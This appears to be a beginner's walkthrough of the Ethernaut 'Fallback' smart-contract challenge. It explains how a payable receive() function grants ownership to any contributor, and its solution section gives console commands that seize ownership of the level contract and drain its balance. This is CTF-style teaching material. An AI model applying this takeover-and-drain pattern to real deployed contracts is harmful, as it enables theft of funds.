# Ethernaut - Walkthrough for Noobs - 1 - Fallback

In this series of articles, I will talk about how to solve the ethernaut challenge.

I will explain the concepts to provide you with all the tools to solve the challenge on your own without revealing the solutions. In the end, however, I will provide the solution in case anyone is stuck.

> Here is our objective:
> 
> You will beat this level if
> 
> 1. you claim ownership of the contract
>     
> 2. you reduce its balance to 0.
>     

## Concept

Only the following code is of use to us.

```solidity
constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }
```

```solidity
function contribute() public payable { 
    require(msg.value < 0.001 ether); 
    contributions[msg.sender] += msg.value; 
    if(contributions[msg.sender] > contributions[owner]) { owner =           msg.sender; } 
}
```

The first code block constructs that the owner of the contract has contributed 1000 ethers. The second block states that if the contributions of `msg.sender` exceeds that of the owner `msg.sender` becomes the new owner. But the catch here is that the `require` statement only allows us to send less than 0.001 ethers every time. We can possibly write a loop function and exploit it but let's be honest, nobody actually will have 1000 ethers lying around even on the Goerli test net.

To exploit the code, we need something else.

```solidity
receive() external payable {
require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```

This is what you would call a fallback function. It will automatically trigger when:

* we call a function that does not exist.
    
* the function selector does not match any function in the contract.
    
* the call is made without call data.
    

As you can see the `receive` function is an *external* and *payable* function. What that essentially means is that it can only be called from outside the contract and allows the contract to be able to receive ether.

It also requires us to fulfill certain criteria: `require(msg.value > 0 && contributions[msg.sender] > 0);`

If we do that we will be able to become the owner and subsequently be able to reduce its balance to 0 using the withdraw function.

```solidity
 function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }
```

## Solution

* Open the console in your browser and create a new level instance.
    
* Contribute at least 1 Wei.
    
* ```solidity
        await contract.contribute({ value: 1 })
    ```
    
* Now we can trigger the `receive` fallback function.
    
* ```solidity
        await contract.sendTransaction({ from: player, value: 1 })
    ```
    
* Now, this should set us up as the new contract owner.
    
* Call the withdraw function to drain the funds.
    
* ```solidity
      await contract.withdraw()
    ```
    
* We should have fulfilled all the objectives. You can cross-verify by checking the balance in the contract.
    
* ```solidity
      await getBalance(contract.address)
    ```
    
    If it returns 0, you can submit the instance.
    

Fallback ✅